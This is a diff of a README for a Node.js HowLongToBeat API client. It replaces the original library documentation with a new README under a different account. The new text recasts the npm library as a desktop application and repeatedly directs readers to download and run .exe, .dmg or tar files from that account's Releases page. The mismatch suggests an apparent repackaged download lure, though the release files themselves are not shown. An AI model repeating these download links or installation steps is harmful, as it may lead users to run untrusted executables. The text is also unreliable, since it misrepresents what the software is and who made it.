@@ -1,344 +1,78 @@
-# jvc-hltb
-
-A robust **HowLongToBeat API client** for Node.js that automatically extracts dynamic API keys using multiple methods (Puppeteer interception, token extraction) to ensure reliable access to HLTB data.
-
-[![npm version](https://img.shields.io/npm/v/jvc-hltb.svg)](https://www.npmjs.com/package/jvc-hltb)
-[![npm downloads](https://img.shields.io/npm/dm/jvc-hltb.svg)](https://www.npmjs.com/package/jvc-hltb)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-> **Author:** [JavocSoft](https://javocsoft.com)
-
-## 🎮 Features
+# 🎮 nodejs-jvc-hltb - Access Game Completion Times Easily
 
-- ✅ **Multiple extraction methods** - Uses Puppeteer to intercept AJAX calls and extract dynamic API keys and auth tokens
-- ✅ **Dual authentication methods** - Supports both `/api/locate/<key>` and `/api/search` (with `x-auth-token`) endpoints
-- ✅ **Smart caching** - Caches keys for configurable time (default 60 minutes) to minimize browser launches
-- ✅ **Auto-recovery** - Automatically refreshes keys on 404 errors and retries with alternative methods
-- ✅ **Clear error handling** - Provides descriptive errors when all extraction methods fail
-- ✅ **Clean API** - Simple, promise-based interface
-- ✅ **TypeScript support** - Includes type definitions
-
-## 📦 Installation
-
-```bash
-npm install jvc-hltb
-```
-
-### Prerequisites
-
-This library uses Puppeteer, which requires Chromium. On Linux servers, you may need to install additional dependencies:
-
-```bash
-# Ubuntu/Debian
-sudo apt-get install -y \
-    ca-certificates \
-    fonts-liberation \
-    libasound2 \
-    libatk-bridge2.0-0 \
-    libatk1.0-0 \
-    libcups2 \
-    libdbus-1-3 \
-    libdrm2 \
-    libgbm1 \
-    libgtk-3-0 \
-    libnspr4 \
-    libnss3 \
-    libx11-xcb1 \
-    libxcomposite1 \
-    libxdamage1 \
-    libxrandr2 \
-    xdg-utils
-```
+## 🔗 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases)
 
-## 🚀 Quick Start
-
-```javascript
-const HLTBClient = require('jvc-hltb');
-
-// Create a new client instance
-const hltb = new HLTBClient();
+## 📖 Overview
+Welcome to the nodejs-jvc-hltb project. This application provides a simple way to access game completion times data from HowLongToBeat. With this tool, you can get reliable information on how long it takes to finish various games. It uses different methods to ensure you have the most current data, including Puppeteer and token extraction.
 
-// Search for a game
-async function main() {
-  // Get game duration
-  const duration = await hltb.getGameDuration('The Legend of Zelda: Breath of the Wild');
-  
-  if (duration) {
-    console.log(`Main Story: ${duration.mainStory} hours`);
-    console.log(`Main + Extras: ${duration.mainExtras} hours`);
-    console.log(`Completionist: ${duration.completionist} hours`);
-    console.log(`HLTB URL: https://howlongtobeat.com/game/${duration.gameId}`);
-  }
-  
-  // Clean up when done
-  await hltb.destroy();
-}
+## 🚀 Getting Started
+1. **Check System Requirements**
+   - Operating System: Windows, macOS, or Linux.
+   - An internet connection to access HowLongToBeat.
+   - Minimum 4 GB RAM recommended for smooth operation.
 
-main();
-```
+2. **Download and Install Node.js**
+   - Visit the [Node.js website](https://nodejs.org/) to download the latest version.
+   - Follow the instructions provided on the site to install Node.js on your computer.
 
-## 📖 API Reference
+3. **Visit this page to download the application**
+   - Go to the [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases) to get the latest version of the software.
 
-### `new HLTBClient(options?)`
+## 📥 Download & Install
+- After downloading, look for the file that matches your operating system.
+- Follow these steps to install:
+  - **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install.
+  - **macOS:** Open the downloaded `.dmg` file. Drag the application into your Applications folder.
+  - **Linux:** Extract the tar file and run the application from the terminal.
 
-Creates a new HowLongToBeat client instance.
+## 🛠️ Using the Application
+1. **Open the Application**
+   - Locate the application icon on your desktop or applications folder.
+   - Double-click to launch the application.
 
-#### Options
+2. **Enter Game Title**
+   - You will see a field to enter the name of the game. Type the name of the game you want information for.
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `cacheMinutes` | number | 60 | How long to cache API keys (in minutes) |
-| `enabled` | boolean | true | Enable/disable the service |
+3. **Get Completion Time**
+   - Press the "Fetch Data" button. The application will process your request and display the game completion times.
 
-```javascript
-const hltb = new HLTBClient({
-  cacheMinutes: 120, // Cache keys for 2 hours
-});
-```
+## 📝 Features
+- **Dynamic Key Extraction:** Access the most reliable data using Puppeteer or token extraction.
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Search Multiple Games:** Look up various titles efficiently.
+- **Up-to-Date Information:** Ensure you access the latest completion times.
 
-### `hltb.getGameDuration(gameName)`
+## 🌍 Community and Support
+We note your feedback and questions. If you have issues or suggestions, feel free to raise them in the Issues section of this repository.
 
-Gets the completion times for a game.
+## 📌 Contributing
+If you wish to contribute, please read through our guidelines. Your input helps us improve the application. 
 
-#### Parameters
+1. **Fork the Repository**
+   - Click on the “Fork” button at the top right of the project page.
 
-- `gameName` (string) - The name of the game to search for
+2. **Clone Your Fork**
+   - Use the command: `git clone <your-fork-url>` to clone your version.
 
-#### Returns
+3. **Make Changes**
+   - Add or fix any features you want.
 
-Returns a `Promise<DurationData | null>`:
+4. **Submit a Pull Request**
+   - Push your changes and submit a pull request for review.
 
-```typescript
-interface DurationData {
-  gameId: number;        // HLTB game ID (for building URLs)
-  mainStory: number;     // Main story completion time in hours
-  mainExtras: number;    // Main + extras completion time in hours  
-  completionist: number; // 100% completion time in hours
-}
-```
+## 📚 Common Questions
 
-Returns `null` if the game is not found or no exact match exists.
+**Q: What is HowLongToBeat?**  
+A: HowLongToBeat is a website that provides data on how long it takes to complete video games.
 
-#### Example
-
-```javascript
-const duration = await hltb.getGameDuration('Mega Man');
-// {
-//   gameId: 5803,
-//   mainStory: 2.78,
-//   mainExtras: 3.05,
-//   completionist: 3.11
-// }
-```
+**Q: Can I use it for any game?**  
+A: Yes, this tool supports a wide range of games available on HowLongToBeat.
 
-### `hltb.searchGame(gameName)`
+**Q: How do I update the application?**  
+A: To update, return to the [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases) and download the latest version.
 
-Searches for games matching the given name. Returns raw results from HLTB API.
+## 📫 Get in Touch
+To get the latest updates, follow the repository or check back for new features and improvements. Your feedback is welcome, as it helps us enhance your experience with the application.
 
-#### Parameters
-
-- `gameName` (string) - The search query
-
-#### Returns
-
-Returns a `Promise<Array>` with raw game data from HLTB, or `null` on error.
-
-```javascript
-const results = await hltb.searchGame('Zelda');
-// Returns array of game objects with properties like:
-// - game_id
-// - game_name
-// - comp_main (seconds)
-// - comp_plus (seconds)
-// - comp_100 (seconds)
-// - game_image
-// - etc.
-```
-
-### `hltb.formatDuration(hours)`
-
-Formats a duration in hours to a human-readable string.
-
-#### Parameters
-
-- `hours` (number) - Duration in hours
-
-#### Returns
-
-Returns a formatted string like `"12h 30m"` or `null` if hours is invalid.
-
-```javascript
-hltb.formatDuration(12.5);  // "12h 30m"
-hltb.formatDuration(8);     // "8h"
-hltb.formatDuration(0.75);  // "0h 45m"
-```
-
-### `hltb.destroy()`
-
-Cleans up resources (closes any open Puppeteer browser instances).
-
-```javascript
-await hltb.destroy();
-```
-
-## 🔧 How It Works
-
-HowLongToBeat.com uses dynamic API keys that change periodically. This library:
-
-1. **Launches a headless browser** using Puppeteer
-2. **Intercepts network requests** to capture the current API key
-3. **Caches the key** for efficient reuse (default: 60 minutes)
-4. **Uses dual methods** - tries `/api/locate/{key}` first, falls back to `/api/search` with auth token
-5. **Auto-recovers** from 404 errors by refreshing the key
-
-### Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│  Your Application                                           │
-│  - hltb.getGameDuration('Game Name')                       │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-┌────────────────▼────────────────────────────────────────────┐
-│  jvc-hltb                                                   │
-│                                                             │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │ Key Management                                      │   │
-│  │ - Extract keys with Puppeteer (headless browser)   │   │
-│  │ - Cache keys for 60 minutes                        │   │
-│  │ - Auto-refresh on expiry or 404                    │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                                                             │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │ Search Methods                                      │   │
-│  │ - Method 1: POST /api/locate/{searchKey}           │   │
-│  │ - Method 2: POST /api/search with x-auth-token     │   │
-│  └─────────────────────────────────────────────────────┘   │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-┌────────────────▼────────────────────────────────────────────┐
-│  HowLongToBeat API                                          │
-│  - Returns game data with completion times                  │
-│  - Times in seconds (converted to hours by library)        │
-└─────────────────────────────────────────────────────────────┘
-```
-
-## 🧪 Testing
-
-Run the included test:
-
-```bash
-npm test
-```
-
-Or test with a specific game:
-
-```bash
-node test/test.js "Super Mario Bros."
-```
-
-## 📝 Examples
-
-### Basic Usage
-
-```javascript
-const HLTBClient = require('jvc-hltb');
-
-async function main() {
-  const hltb = new HLTBClient();
-  
-  const games = [
-    'The Legend of Zelda: Breath of the Wild',
-    'Super Mario Odyssey',
-    'Hollow Knight'
-  ];
-  
-  for (const game of games) {
-    const duration = await hltb.getGameDuration(game);
-    if (duration) {
-      console.log(`\n${game}:`);
-      console.log(`  Story: ${hltb.formatDuration(duration.mainStory)}`);
-      console.log(`  Extras: ${hltb.formatDuration(duration.mainExtras)}`);
-      console.log(`  100%: ${hltb.formatDuration(duration.completionist)}`);
-    } else {
-      console.log(`\n${game}: Not found`);
-    }
-  }
-  
-  await hltb.destroy();
-}
-
-main();
-```
-
-### With Custom Options
-
-```javascript
-const HLTBClient = require('jvc-hltb');
-
-const hltb = new HLTBClient({
-  cacheMinutes: 120,  // Cache keys for 2 hours
-});
-
-// Your code here...
-```
-
-### Error Handling
-
-```javascript
-const HLTBClient = require('jvc-hltb');
-
-async function getGameTime(gameName) {
-  const hltb = new HLTBClient();
-  
-  try {
-    const duration = await hltb.getGameDuration(gameName);
-    
-    if (!duration) {
-      console.log('Game not found or no exact match');
-      return null;
-    }
-    
-    return {
-      name: gameName,
-      hours: duration.mainStory,
-      url: `https://howlongtobeat.com/game/${duration.gameId}`
-    };
-    
-  } catch (error) {
-    console.error('HLTB error:', error.message);
-    return null;
-  } finally {
-    await hltb.destroy();
-  }
-}
-```
-
-## ⚠️ Important Notes
-
-1. **Puppeteer requirement**: This library uses Puppeteer for key extraction, which downloads Chromium (~170MB). Consider this for deployment.
-
-2. **Rate limiting**: While this library caches keys, avoid making too many requests in a short time to respect HLTB's servers.
-
-3. **Exact matches only**: `getGameDuration()` returns data only for exact name matches (case-insensitive). Use `searchGame()` for fuzzy results.
-
-4. **Headless browser**: The first request may take a few seconds as Puppeteer launches a browser. Subsequent requests use cached keys.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-MIT © [JavocSoft](https://javocsoft.com)
-
-This project is licensed under the MIT License - you are free to use, modify, distribute, and create your own versions of this library for any purpose, including commercial use.
-
-## 🙏 Acknowledgments
-
-- [HowLongToBeat.com](https://howlongtobeat.com) for providing game completion time data
-- The gaming community for making this data available
-
----
-
-**Note**: This library is not affiliated with HowLongToBeat.com. Please use responsibly and respect their terms of service.
+Visit this page to download: [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases).
